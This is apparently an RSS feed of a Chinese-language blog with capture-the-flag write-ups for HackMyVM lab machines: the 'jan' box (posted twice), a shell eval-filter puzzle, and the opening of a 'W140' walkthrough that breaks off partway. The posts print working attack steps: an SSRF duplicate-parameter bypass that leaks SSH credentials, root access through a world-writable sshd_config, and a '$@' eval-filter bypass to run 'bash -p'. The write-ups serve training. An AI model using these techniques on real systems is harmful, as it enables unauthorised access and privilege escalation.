1   0.23 ms 192.168.205.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.01 seconds
                                                                             
```

8080端口sT和sS参数探测不出来，所以建议不使用

# 2.踩点

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/                            
Welcome to our Public Server. Maybe Internal.                                                                                                                                    
```

进行目录爆破

```
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u http://192.168.205.136:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.136:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, md, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        7w       45c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
400      GET        1l        3w       24c http://192.168.205.136:8080/redirect
200      GET        2l        2w       16c http://192.168.205.136:8080/robots.txt
[####################] - 54s   598005/598005  0s      found:2       errors:0    
[####################] - 54s   598005/598005  11090/s http://192.168.205.136:8080/           
```

探索一波

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/redirect
Parameter 'url' needed.
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/robots.txt
/redirect
/credz                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/credz   
Only accessible internally.                                                                                                                                    
```

目前来看出题思路是通过/redirect访问/credz，进行尝试

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/credz   
Only accessible internally.                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt
Only accessible internally.                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl -I http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt
HTTP/1.1 200 OK
Date: Mon, 03 Feb 2025 04:47:07 GMT
Content-Length: 27
Content-Type: text/plain; charset=utf-8
```

这里我测试了挺多绕过检测的方法，我就不写出来了，正确方法是

```
┌──(kali㉿kali)-[~/test]
└─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=192.168.205.136:8080/credz'
                                         
```

返回空白，空白就是有机可寻

```
┌──(kali㉿kali)-[~/test]
└─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=127.0.0.1:8080/credz'
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=/credz'            
ssh/EazyLOL                                                                                                                                     
```

登录

```
┌──(kali㉿kali)-[~/test]
└─$ ssh ssh@192.168.205.136
The authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.
ssh@192.168.205.136's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~$ id
uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)
```

# 4.提权

```
jan:~$ ls -al
total 12
drwxr-sr-x    2 ssh      ssh           4096 Jan 28 09:27 .
drwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..
lrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -&gt; /dev/null
-rw-------    1 ssh      ssh             22 Jan 28 09:20 user.txt
jan:~$ sudo -l
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User ssh may run the following commands on jan:
    (root) NOPASSWD: /sbin/service sshd restart
```

大概率是改ssh的配置文件了，看看有没有权限

```
jan:~$ ls -al /etc/ssh/sshd_config
-rw-rw-rw-    1 root     root          3355 Jan 28 09:01 /etc/ssh/sshd_config
```

有权限，那我们生成一个密钥，通过密钥登录root就好了

```
jan:~$ ssh-keygen -t rsa 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/ssh/.ssh/id_rsa): 
Created directory '/home/ssh/.ssh'.
Enter passphrase for '/home/ssh/.ssh/id_rsa' (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/ssh/.ssh/id_rsa
Your public key has been saved in /home/ssh/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:FNapkUoVgyB2BhdqurZup7sNDvaCmQhWvV/OC5czxA8 ssh@jan
The key's randomart image is:
+---[RSA 3072]----+
|  +.*o o*+ .     |
| . *  o.ooo      |
|  o .. ..o       |
| o . ...o        |
|. .   . SE       |
|.o   .  ..+      |
|B*    ..+= .     |
|Xo=.   .ooo      |
|oB*o     ..      |
+----[SHA256]-----+

jan:~$ cp .ssh/id_rsa.pub /tmp/authorized_keys
jan:~$ chmod 600 /tmp/authorized_keys 
jan:~$ ls -la /tmp/
total 8
drwxrwxrwt    4 root     root           100 Feb  3 04:56 .
drwxr-xr-x   21 root     root          4096 Jan 28 09:01 ..
drwxrwxrwt    2 root     root            40 Feb  3 04:39 .ICE-unix
drwxrwxrwt    2 root     root            40 Feb  3 04:39 .X11-unix
-rw-------    1 ssh      ssh            561 Feb  3 04:56 authorized_keys

jan:~$ vi /etc/ssh/sshd_config
```

![image-20250331191252272](https://7r1umphk.github.io/image/20250331191252331.png)

```
jan:~$ sudo /sbin/service sshd restart
 * Stopping sshd ...                                                                                                             [ ok ]
 * Starting sshd ...                                                                                                             [ ok ]
jan:~$ ssh root@127.0.0.1
/etc/ssh/ssh_config: line 23: Bad configuration option: banner
/etc/ssh/ssh_config: terminating, 1 bad configuration options
```

banner应该也能提权，但是我不管它了

```
jan:~$ vi /etc/ssh/ssh_config
```

![image-20250331191302680](https://7r1umphk.github.io/image/20250331191302731.png)

```
jan:~$ ssh root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

# 5.第二种方法

![image-20250331191312627](https://7r1umphk.github.io/image/20250331191312690.png)

🔗https://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83

这个方法我没试过，自己尝试一下吧

&lt;!-- ##{'timestamp':1738580133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_jan.html</guid><pubDate>Fri, 27 Jun 2025 09:27:54 +0000</pubDate></item><item><title>hmv_jan</title><link>https://7r1UMPHK.github.io/post/hmv_jan.html</link><description># 0.简介

靶机：https://hackmyvm.eu/machines/machine.php?vm=jan
 难度：绿色
 目标 IP：192.168.205.136
 本机 IP：192.168.205.128

# 1.扫描

nmap起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A 192.168.205.136
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:40 CST
Nmap scan report for 192.168.205.136
Host is up (0.00023s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
|_  256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
8080/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Mon, 03 Feb 2025 04:40:49 GMT
|     Content-Length: 45
|     Content-Type: text/plain; charset=utf-8
|     Welcome to our Public Server. Maybe Internal.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=2/3%Time=67A048E1%P=x86_64-pc-linux-gnu%r(Get
SF:Request,A2,'HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Feb\x20202
SF:5\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x20Public\x20Server
SF:\.\x20Maybe\x20Internal\.')%r(HTTPOptions,A2,'HTTP/1\.0\x20200\x20OK\r\
SF:nDate:\x20Mon,\x2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Lengt
SF:h:\x2045\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcom
SF:e\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.')%r(RTSPReq
SF:uest,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est')%r(FourOhFourRequest,A2,'HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x
SF:2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x
SF:20Public\x20Server\.\x20Maybe\x20Internal\.')%r(Socks5,67,'HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')%r(GenericLines,
SF:67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')
SF:%r(Help,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest')%r(SSLSessionReq,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request')%r(LPDString,67,'HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request')%r(SIPOptions,67,'HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')%r(OfficeScan,A3,'H
SF:TTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20he
SF:ader\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20
SF:header');
MAC Address: 08:00:27:3A:49:D7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.205.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.01 seconds
                                                                             
```

8080端口sT和sS参数探测不出来，所以建议不使用

# 2.踩点

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/                            
Welcome to our Public Server. Maybe Internal.                                                                                                                                    
```

进行目录爆破

```
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u http://192.168.205.136:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.136:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, md, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        7w       45c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
400      GET        1l        3w       24c http://192.168.205.136:8080/redirect
200      GET        2l        2w       16c http://192.168.205.136:8080/robots.txt
[####################] - 54s   598005/598005  0s      found:2       errors:0    
[####################] - 54s   598005/598005  11090/s http://192.168.205.136:8080/           
```

探索一波

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/redirect
Parameter 'url' needed.
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/robots.txt
/redirect
/credz                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/credz   
Only accessible internally.                                                                                                                                    
```

目前来看出题思路是通过/redirect访问/credz，进行尝试

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/credz   
Only accessible internally.                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt
Only accessible internally.                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl -I http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt
HTTP/1.1 200 OK
Date: Mon, 03 Feb 2025 04:47:07 GMT
Content-Length: 27
Content-Type: text/plain; charset=utf-8
```

这里我测试了挺多绕过检测的方法，我就不写出来了，正确方法是

```
┌──(kali㉿kali)-[~/test]
└─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=192.168.205.136:8080/credz'
                                         
```

返回空白，空白就是有机可寻

```
┌──(kali㉿kali)-[~/test]
└─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=127.0.0.1:8080/credz'
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=/credz'            
ssh/EazyLOL                                                                                                                                     
```

登录

```
┌──(kali㉿kali)-[~/test]
└─$ ssh ssh@192.168.205.136
The authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.
ssh@192.168.205.136's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~$ id
uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)
```

# 4.提权

```
jan:~$ ls -al
total 12
drwxr-sr-x    2 ssh      ssh           4096 Jan 28 09:27 .
drwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..
lrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -&gt; /dev/null
-rw-------    1 ssh      ssh             22 Jan 28 09:20 user.txt
jan:~$ sudo -l
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User ssh may run the following commands on jan:
    (root) NOPASSWD: /sbin/service sshd restart
```

大概率是改ssh的配置文件了，看看有没有权限

```
jan:~$ ls -al /etc/ssh/sshd_config
-rw-rw-rw-    1 root     root          3355 Jan 28 09:01 /etc/ssh/sshd_config
```

有权限，那我们生成一个密钥，通过密钥登录root就好了

```
jan:~$ ssh-keygen -t rsa 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/ssh/.ssh/id_rsa): 
Created directory '/home/ssh/.ssh'.
Enter passphrase for '/home/ssh/.ssh/id_rsa' (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/ssh/.ssh/id_rsa
Your public key has been saved in /home/ssh/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:FNapkUoVgyB2BhdqurZup7sNDvaCmQhWvV/OC5czxA8 ssh@jan
The key's randomart image is:
+---[RSA 3072]----+
|  +.*o o*+ .     |
| . *  o.ooo      |
|  o .. ..o       |
| o . ...o        |
|. .   . SE       |
|.o   .  ..+      |
|B*    ..+= .     |
|Xo=.   .ooo      |
|oB*o     ..      |
+----[SHA256]-----+

jan:~$ cp .ssh/id_rsa.pub /tmp/authorized_keys
jan:~$ chmod 600 /tmp/authorized_keys 
jan:~$ ls -la /tmp/
total 8
drwxrwxrwt    4 root     root           100 Feb  3 04:56 .
drwxr-xr-x   21 root     root          4096 Jan 28 09:01 ..
drwxrwxrwt    2 root     root            40 Feb  3 04:39 .ICE-unix
drwxrwxrwt    2 root     root            40 Feb  3 04:39 .X11-unix
-rw-------    1 ssh      ssh            561 Feb  3 04:56 authorized_keys

jan:~$ vi /etc/ssh/sshd_config
```

![image-20250331191252272](https://7r1umphk.github.io/image/20250331191252331.png)

```
jan:~$ sudo /sbin/service sshd restart
 * Stopping sshd ...                                                                                                             [ ok ]
 * Starting sshd ...                                                                                                             [ ok ]
jan:~$ ssh root@127.0.0.1
/etc/ssh/ssh_config: line 23: Bad configuration option: banner
/etc/ssh/ssh_config: terminating, 1 bad configuration options
```

banner应该也能提权，但是我不管它了

```
jan:~$ vi /etc/ssh/ssh_config
```

![image-20250331191302680](https://7r1umphk.github.io/image/20250331191302731.png)

```
jan:~$ ssh root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

# 5.第二种方法

![image-20250331191312627](https://7r1umphk.github.io/image/20250331191312690.png)

🔗https://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83

这个方法我没试过，自己尝试一下吧

&lt;!-- ##{'timestamp':1738580133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_jan.html</guid><pubDate>Fri, 27 Jun 2025 09:27:15 +0000</pubDate></item><item><title>hello world</title><link>https://7r1UMPHK.github.io/post/hello%20world.html</link><description>hello worldsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hello%20world.html</guid><pubDate>Fri, 27 Jun 2025 09:15:28 +0000</pubDate></item><item><title>群主题</title><link>https://7r1UMPHK.github.io/post/qun-zhu-ti.html</link><description>好久没打过靶机了，也没更新过，今天在群里看到了群主发了一个题目就玩了一下，顺便水一期wp

题目：

![image-20250322153403638](https://7r1umphk.github.io/image/20250322153403675.png)

```
PATH=/usr/bin
read INPUT &lt; &lt;(head -n1 | tr -d '[A-Za-z0-9/]')
eval '$INPUT'
```

浅瞄了一眼，发现tr删除了所有字母、数字和斜杠，但保留特殊符号，那就有搞头

ps:$@ 在 Shell 中表示脚本的所有参数，可被 eval 解析。



我们可以构造输入$@，绕过字符过滤。然后再传递参数bash -p启动特权Shell。

解法：

```
echo '$@' | ./a.sh 'bash -p'
```

但是我的不是预期解

![image-20250322153428456](https://7r1umphk.github.io/image/20250322153428487.png)

![image-20250322153442791](https://7r1umphk.github.io/image/20250322153442822.png)

这两个是预期的

然后.....

![image-20250322153453994](https://7r1umphk.github.io/image/20250322153454035.png)

加强版：

```
#!/bin/bash

PATH=/usr/bin

a=$((RANDOM%100))

echo $a

read -r INPUTS


if [[ '$INPUTS' -ne '$a' ]]; then
    exit 1
fi

read INPUT &lt; &lt;(head -n1 | tr -d '[A-Za-z0-9/]')
eval '$INPUT'
```

加了一个随机数，我本身是说爆破的......

![image-20250322153509806](https://7r1umphk.github.io/image/20250322153509848.png)

然后后面有空瞄了几眼，因为我知道它在进行整数的比较，那我就在想如果输入一个非整数会怎么样，然后......

![image-20250322153523210](https://7r1umphk.github.io/image/20250322153523241.png)

有戏

![image-20250322153725388](https://7r1umphk.github.io/image/20250322153725419.png)

然后我后面我想找一下这方面的资料，但是我没找到，我打算明天再去问问群主，因为他bash比较好（不过我感觉他会自己来看我的wp）

目前我的理解是当使用-ne比较非数字字符串时，Bash会尝试将两边转换为整数。如果转换失败，就会报错什么的，[[ ]]表达式的结果会被视为false，因为比较操作本身无效，导致整个条件判断为假，因此不执行exit 1。



不管了，睡觉，等群主给我解惑了

&lt;!-- ##{'timestamp':1740728321}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/qun-zhu-ti.html</guid><pubDate>Fri, 28 Feb 2025 07:38:41 +0000</pubDate></item><item><title>hmv_w140</title><link>https://7r1UMPHK.github.io/post/hmv_w140.html</link><description># 0.简介

靶机：https://hackmyvm.eu/machines/machine.php?vm=W140
 难度：绿色
 目标 IP：192.168.205.131
 本机 IP：192.168.205.128

# 1.扫描

nmap起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:45 CST
Nmap scan report for 192.168.205.131
Host is up (0.00029s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 ff:fd:b2:0f:38:88:1a:44:c4:2b:64:2c:d2:97:f6:8d (RSA)
|   256 ca:50:54:f7:24:4e:a7:f1:06:46:e7:22:30:ec:95:b7 (ECDSA)
|_  256 09:68:c0:62:83:1e:f1:5d:cb:29:a6:5e:b4:72:aa:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: w140
MAC Address: 08:00:27:EA:A7:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms 192.168.205.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:45 CST
Nmap scan report for 192.168.205.131
Host is up (0.00029s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 ff:fd:b2:0f:38:88:1a:44:c4:2b:64:2c:d2:97:f6:8d (RSA)
|   256 ca:50:54:f7:24:4e:a7:f1:06:46:e7:22:30:ec:95:b7 (ECDSA)
|_  256 09:68:c0:62:83:1e:f1:5d:cb:29:a6:5e:b4:72:aa:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: w140
MAC Address: 08:00:27:EA:A7:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms 192.168.205.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
```

# 2.踩点

![image-20250331185843031](https://7r1umphk.github.io/image/20250331185843370.png)

有个上传页/service.html，上传个马看看。不行，我们上传正常的图片

![image-20250331185853481](https://7r1umphk.github.io/image/20250331185853810.png)

![image-20250331185859700](https://7r1umphk.github.io/image/20250331185859788.png)

搜索一下有没有利用漏洞

```
┌──(kali㉿kali)-[~/test]
└─$ searchsploit ExifTool 12.37       
Exploits: No Results
Shellcodes: No Results
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ searchsploit ExifTool 12.3 
Exploits: No Results
Shellcodes: No Results
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ searchsploit ExifTool 12  
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
ExifTool 12.23 - Arbitrary Code Execution                                                           | linux/local/50911.py
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                         
```

版本不一样，我们继续搜索

https://github.com/cowsecurity/CVE-2022-23935找到一个版本一样的，我们尝试利用

```
┌──(kali㉿kali)-[~/test]
└─$ git clone https://github.com/0xFTW/CVE-2022-23935
正克隆到 'CVE-2022-23935'...
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 7 (delta 1), reused 7 (delta 1), pack-reused 0 (from 0)
接收对象中: 100% (7/7), 完成.
处理 delta 中: 100% (1/1), 完成.
                     
┌──(kali㉿kali)-[~/test]
└─$ cd CVE-2022-23935 
                                                                                                                                    
┌──(kali㉿kali)-[~/test/CVE-2022-23935]
└─$chmod +x CVE-2022-23935.py

┌──(kali㉿kali)-[~/test/CVE-2022-23935]
└─$ python3 -m venv env
                                                                                                                                    
